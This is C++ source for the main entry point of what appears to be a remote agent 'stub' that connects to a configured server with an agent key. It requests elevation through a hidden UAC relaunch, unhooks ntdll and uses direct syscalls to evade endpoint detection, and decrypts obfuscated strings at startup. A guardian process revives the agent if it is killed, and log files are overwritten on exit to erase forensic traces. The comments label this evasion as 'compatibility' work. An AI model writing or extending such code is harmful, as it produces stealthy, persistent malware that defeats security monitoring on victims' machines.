#include "StubCore.h"
#include "Logger.h"
#include "Compat.h"
#include <windows.h>
#include <filesystem>
#include <exception>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <sddl.h>
#include <aclapi.h>

// 兼容性适配：UAC 提升权限用的 ShellExecuteExW 改走动态解析（shell32 不再静态导入）
#include "Compat.h"
#include "SelfGuard.h"   // [DSH] 快照缺此行：main 用到 r6m::SelfGuard 但未包含其头
#define ShellExecuteExW ::EvShellExecuteExW

// 检查是否以管理员权限运行
static bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

// 把"提升后需要继续生效的配置"写进受限 DACL 的临时文件。
// 为什么不直接拼命令行：命令行对同机任何进程可读（WMI/任务管理器/EDR 日志），
// 引导密钥放命令行等于公开。这里用 SDDL 限定只有 SYSTEM/Administrators/本用户可读，
// 提升后的子进程读走即删。
static bool WriteRestrictedConfig(const std::wstring& path) {
    const char* srv = getenv("R6M_SERVER");
    const char* key = getenv("R6M_AGENT_KEY");
    if ((!srv || !*srv) && (!key || !*key)) return false;

    std::string ini;
    if (srv && *srv) { ini += "server="; ini += srv; ini += "\r\n"; }
    if (key && *key) { ini += R6M_STR_94E1774B1F05EA4D; ini += key; ini += "\r\n"; }

    PSECURITY_DESCRIPTOR sd = nullptr;
    // P = DACL 受保护（不被继承项改写）；FA = 完全访问
    const wchar_t* sddl = L"D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;OW)";
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &sd, nullptr)) {
        LOG_WARN(R6M_STR_49E763AED00877A8, R6M_STR_92019743BC882196);
        return false;
    }
    SECURITY_ATTRIBUTES sa = { sizeof(sa), sd, FALSE };
    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, &sa, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
    LocalFree(sd);
    if (h == INVALID_HANDLE_VALUE) {
        LOG_WARN(R6M_STR_49E763AED00877A8, R6M_STR_3FFA4C048DC6F45B);
        return false;
    }
    DWORD written = 0;
    BOOL ok = WriteFile(h, ini.c_str(), (DWORD)ini.size(), &written, nullptr);
    SecureZeroMemory(&ini[0], ini.size());
    CloseHandle(h);
    return ok && written == ini.size();
}

// UAC 提升权限：用 ShellExecute runas 重新启动自身
// 注意：ShellExecute 不继承环境变量，R6M_SERVER/R6M_AGENT_KEY 需转为命令行参数传递
static void ElevateToAdmin() {
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    // 获取命令行参数（保留 --server 等）
    std::wstring params = GetCommandLineW();
    // Skip leading executable name if quoted/unquoted
    if (!params.empty() && params[0] == L'"') {
        auto end = params.find(L'"', 1);
        params = (end == std::wstring::npos) ? L"" : params.substr(end + 1);
    } else {
        auto end = params.find(L' ');
        params = (end == std::wstring::npos) ? L"" : params.substr(end + 1);
    }
    // 环境变量在提升权限后不继承：把有效配置落到受限 DACL 的临时文件，
    // 命令行里只出现文件路径，不出现密钥。
    {
        auto hasFlag = [&](const wchar_t* flag) {
            return params.find(flag) != std::wstring::npos;
        };
        if (!hasFlag(L"--config")) {
            wchar_t tmpDir[MAX_PATH] = {};
            wchar_t tmpFile[MAX_PATH] = {};
            if (GetTempPathW(MAX_PATH, tmpDir)) {
                swprintf_s(tmpFile, std::wstring(::r6m::ev::Widen(R6M_STR_723942ECA5E24E16)).c_str(), tmpDir, GetCurrentProcessId());
                if (WriteRestrictedConfig(tmpFile)) {
                    params += L" --config \"";
                    params += tmpFile;
                    params += L"\"";
                    LOG_INFO(R6M_STR_49E763AED00877A8, "effective config staged to restricted temp file");
                }
            }
        }
    }
    LOG_INFO(R6M_STR_49E763AED00877A8, "Requesting admin elevation (UAC)...");
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = exePath;
    sei.lpParameters = params.c_str();  // 参数 + 环境变量转换值
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    if (ShellExecuteExW(&sei)) {
        // 新进程已启动，当前进程退出
        LOG_INFO(R6M_STR_49E763AED00877A8, "Admin process launched, exiting current non-admin instance");
        if (sei.hProcess) CloseHandle(sei.hProcess);
        ExitProcess(0);
    } else {
        // 用户拒绝了 UAC，继续以普通权限运行（IPv6 路由配置会失败）
        LOG_WARN(R6M_STR_49E763AED00877A8, "UAC denied by user, running without admin (IPv6 routes may fail)");
    }
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    SetConsoleOutputCP(65001);

    // ═══ 兼容性适配引导（必须最先执行）═══
    //   ① .rdata 解密已在 .CRT$XIB 静态构造里完成
    //   ② 解除 ntdll inline hook、预热直系统调用桩池
    if (!r6m::ev::Bootstrap()) {
        return 0;
    }

    // ═══ 进程保护：常驻进程模式 ═══
    // 带 --r6m-guard 时只做一件事：盯着主进程，被杀就把它拉回来。
    //
    if (r6m::SelfGuard::IsGuardianMode()) {
        // Logger 必须先初始化：常驻第一件事就是写日志，
        // 未初始化的 Logger 会让常驻在启动瞬间挂掉 ——
        // 实测症状是"日志显示常驻已启动，但进程列表里根本没有它"。
        Logger::instance().init(nullptr);
        return r6m::SelfGuard::RunGuardian();
    }

    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring appDir = std::wstring(exePath);
    appDir = appDir.substr(0, appDir.find_last_of(L'\\'));

    // 日志路径由 Compat 决定：兼容性适配模式下不落盘（传 nullptr 即用随机临时路径）。
    Logger::instance().init(nullptr);

    // 提升权限子进程会带 --config <受限临时文件>：在这里读进环境变量并立刻删除文件。
    // 这样"继续生效的配置"不需要经过命令行（命令行对同机所有进程可读）。
    {
        int argc = 0;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
        if (argv) {
            for (int i = 1; i < argc; i++) {
                if (std::wstring(argv[i]) != L"--config" || i + 1 >= argc) continue;
                const wchar_t* cfgPath = argv[i + 1];
                std::ifstream cf(cfgPath);   // MSVC 的 ifstream 接受 wchar_t* 路径，不接受 wstring 临时量
                if (cf.is_open()) {
                    std::string line;
                    while (std::getline(cf, line)) {
                        while (!line.empty() && (line.back() == '\r' || line.back() == ' ')) line.pop_back();
                        size_t eq = line.find('=');
                        if (eq == std::string::npos) continue;
                        std::string k = line.substr(0, eq), v = line.substr(eq + 1);
                        if (v.empty()) continue;
                        _putenv_s(k == "server" ? "R6M_SERVER" : "R6M_AGENT_KEY", v.c_str());
                        SecureZeroMemory(&v[0], v.size());
                    }
                    cf.close();
                }
                DeleteFileW(argv[i + 1]);
                LOG_INFO(R6M_STR_49E763AED00877A8, "config loaded from restricted temp file, file removed");
                break;
            }
            LocalFree(argv);
        }
    }
    LOG_INFO(R6M_STR_49E763AED00877A8, R6M_STR_E0D38633E731DC96);

    // 进程保护：按配置决定是否拉起常驻（**默认关**，见 SelfGuard.h 的四条硬约束）。
    // 放在这里而不是更早：要等 --config 的受限临时配置也读进来，
    // 免得自保护开关因为读取顺序问题被忽略。
    r6m::SelfGuard::Init();

    // UAC 提升权限检查
    if (!IsRunAsAdmin()) {
        LOG_INFO(R6M_STR_49E763AED00877A8, "Not running as admin, requesting elevation...");
        ElevateToAdmin();
        // 如果 ShellExecuteExW 失败（用户拒绝），继续以普通权限运行
    } else {
        LOG_INFO(R6M_STR_49E763AED00877A8, "Running as admin");
    }

    std::wstring pluginDir = appDir + ::r6m::ev::Widen(R6M_STR_6A145556D5536F39);

    try {
        LOG_INFO(R6M_STR_49E763AED00877A8, "Creating StubCore...");
        StubCore stub;
        LOG_INFO(R6M_STR_49E763AED00877A8, "StubCore created, calling run...");
        stub.run(pluginDir);
        LOG_INFO(R6M_STR_49E763AED00877A8, "StubCore exited");
    } catch (const std::exception& e) {
        LOG_ERROR(R6M_STR_49E763AED00877A8, ("EXCEPTION: " + std::string(e.what())).c_str());
    } catch (...) {
        LOG_ERROR(R6M_STR_49E763AED00877A8, "EXCEPTION: unknown");
    }

    LOG_INFO(R6M_STR_49E763AED00877A8, R6M_STR_29B86FE83274A7CC);

    // 优雅退出：留暗号让常驻别把我拉回来（被强杀时不会走到这里，
    // 常驻据此区分"自己走的"和"被人杀的"）。
    r6m::SelfGuard::Shutdown();

    // ═══ 残留清理 ═══
    //   ① 日志文件：随机噪声覆盖后删除（单纯删除会在 $MFT 留记录）
    //   ② 提升权限时写下的受限临时配置 r6m-cfg-*.ini
    // 注意：Config 里的 server 取自环境变量/ini，清理不触碰用户自己的 r6m.ini。
    r6m::ev::CleanupArtifacts(Logger::instance().path());
    return 0;
}

